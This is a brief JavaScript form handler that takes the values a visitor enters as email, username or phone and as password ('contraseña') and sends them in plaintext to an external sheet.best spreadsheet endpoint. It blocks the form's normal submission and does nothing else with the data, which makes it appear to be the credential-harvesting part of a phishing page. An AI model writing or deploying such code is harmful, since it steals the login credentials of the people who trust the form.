const formulario = document.getElementById('formulario');

formulario.addEventListener('submit', (e) => {
    e.preventDefault();

    fetch('https://sheet.best/api/sheets/066d14c8-23f8-48d2-83b6-785496db76a9', {
        method: 'POST',
        mode: 'cors',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            "Correo/user/tel.": formulario.user.value,
            "contraseña": formulario.contraseña.value
        })
    });
})